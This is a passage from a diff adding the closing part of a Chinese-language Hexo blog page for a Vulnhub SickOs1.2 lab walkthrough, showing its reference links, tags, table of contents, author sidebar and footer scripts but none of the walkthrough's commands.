+<ul>
+<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">Basic Linux Privilege Escalation</a></li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">Reverse Shell Cheat Sheet</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+            
+              <a href="/tags/Vulnhub/" rel="tag"># Vulnhub</a>
+            
+              <a href="/tags/OSCP/" rel="tag"># OSCP</a>
+            
+              <a href="/tags/SickOs1-2/" rel="tag"># SickOs1.2</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/03/05/vulnhub-Kioptrix2014-WalkThrough/" rel="next" title="vulnhub-Kioptrix2014-WalkThrough">
+                  <i class="fa fa-chevron-left"></i> vulnhub-Kioptrix2014-WalkThrough
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/03/06/vulnhub-GoldenEye-v1-WalkThrough/" rel="prev" title="vulnhub-GoldenEye-v1-WalkThrough">
+                  vulnhub-GoldenEye-v1-WalkThrough <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SickOs1-2"><span class="nav-text">SickOs1.2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ifconfig"><span class="nav-text">ifconfig</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扫描ip"><span class="nav-text">扫描ip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口探测"><span class="nav-text">端口探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#服务探测"><span class="nav-text">服务探测</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透测试"><span class="nav-text">渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#上传文件"><span class="nav-text">上传文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#连接shell"><span class="nav-text">连接shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集-1"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#然后应该就root了"><span class="nav-text">然后应该就root了</span></a></li></ol></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/header.jpg"
+      alt="Sh4Nn0n">
+  <p class="site-author-name" itemprop="name">Sh4Nn0n</p>
+  <div class="site-description" itemprop="description">^.^</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/fuziyuonly" title="GitHub &rarr; https://github.com/fuziyuonly" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://lingwu111.github.io/" title="https://lingwu111.github.io/" rel="noopener" target="_blank">lingwu</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sh4Nn0n</span>
+</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
